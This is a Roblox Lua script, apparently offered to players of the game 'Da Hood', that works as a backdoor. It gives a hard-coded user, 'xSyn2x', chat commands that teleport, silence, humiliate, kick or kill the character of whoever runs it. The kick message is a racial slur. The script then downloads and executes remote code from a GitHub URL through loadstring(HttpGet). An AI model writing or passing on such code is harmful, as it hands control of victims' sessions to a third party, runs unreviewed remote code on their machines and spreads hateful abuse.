function message(message)
local args = {
    [1] = message,
    [2] = "All"
}
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
end


spawn(function()
pcall(function()
while wait(5) do
local Admin = "xSyn2x"
game.Players[Admin].Chatted:connect(function(msg) 
          if msg == "/e !Bring" or msg == "!Bring" then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[Admin].Character.HumanoidRootPart.CFrame

          elseif
	         msg == "/e !Sorry" or msg == "!Sorry" then
	       message("Im sorry for my troubles i have caused")
	       
	      elseif
            msg == "/e !Kick" or msg == "!Kick" then
                game.Players.LocalPlayer:Kick("Nigger")
            elseif
            msg == "/e !dHumanoid" or msg == "!dHumanoid" then
                game.Players.LocalPlayer.Character.Humanoid:Destroy()
	      end
       end)
    end
   end)
end) 

loadstring(game:HttpGet('https://raw.githubusercontent.com/SpaceYes/Lua/Main/DaHood.Lua'))()
